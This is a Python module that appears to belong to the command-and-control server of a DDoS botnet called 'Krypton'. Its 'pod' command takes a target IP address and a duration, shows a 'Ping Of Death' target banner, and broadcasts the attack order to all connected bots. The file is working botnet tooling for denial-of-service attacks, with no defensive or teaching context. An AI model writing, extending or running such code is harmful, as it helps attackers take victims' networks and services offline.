from colorama import Fore

def pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 3:
        ip = args[1]
        secs = args[2]

        xxxx = '''%s============= (%sTARGET%s) ==============
            %s  IP:%s %s
            %sTIME:%s %s
          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX,
                             Fore.GREEN,
                             Fore.LIGHTBLACK_EX, 
                             Fore.CYAN, 
                             Fore.LIGHTWHITE_EX, 
                             ip, 
                             Fore.CYAN, 
                             Fore.LIGHTWHITE_EX, 
                             secs, 
                             Fore.CYAN, 
                             Fore.LIGHTWHITE_EX, 
                             'Ping Of Death')
        
        if validate_ip(ip):
            if validate_time(secs):
                for x in xxxx.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
                send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                broadcast(data)
            else:
                send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.pod [IP] [TIME]\n')
